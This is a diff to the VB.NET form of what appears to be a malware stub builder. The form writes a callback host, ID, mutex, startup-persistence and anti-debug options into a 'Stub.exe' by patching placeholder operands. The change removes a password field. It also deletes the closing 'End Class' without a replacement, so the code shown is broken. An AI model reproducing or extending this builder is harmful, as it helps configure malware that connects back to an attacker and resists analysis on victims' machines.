@@ -79,10 +79,6 @@ Public Class Form1
                                                 current.Operand = FlatTextBox2.Text
                                             End If
 
-                                            If (str = "[C_Password]") Then
-                                                current.Operand = FlatTextBox4.Text
-                                            End If
-
                                             If (str = "[StartupName]") Then
                                                 current.Operand = getMD5Hash(File.ReadAllBytes(Application.StartupPath & "\" & "Stub.exe"))
                                             End If
@@ -272,7 +268,6 @@ Public Class Form1
             FlatTextBox1.Text = My.Settings.Host
             FlatTextBox2.Text = My.Settings.ID
             FlatTextBox3.Text = My.Settings.MUTEX
-            FlatTextBox4.Text = My.Settings.Password
             FlatTextBox5.Text = My.Settings.Filename
             FlatCheckBox1.Checked = My.Settings.Startup
             FlatCheckBox2.Checked = My.Settings.AntiDebug
@@ -337,7 +332,6 @@ Public Class Form1
             My.Settings.Host = FlatTextBox1.Text
             My.Settings.ID = FlatTextBox2.Text
             My.Settings.MUTEX = FlatTextBox3.Text
-            My.Settings.Password = FlatTextBox4.Text
             My.Settings.Filename = FlatTextBox5.Text
             My.Settings.Startup = FlatCheckBox1.Checked
             My.Settings.AntiDebug = FlatCheckBox2.Checked
@@ -356,4 +350,4 @@ Public Class Form1
             My.Settings.Reset()
         End If
     End Sub
-End Class
+
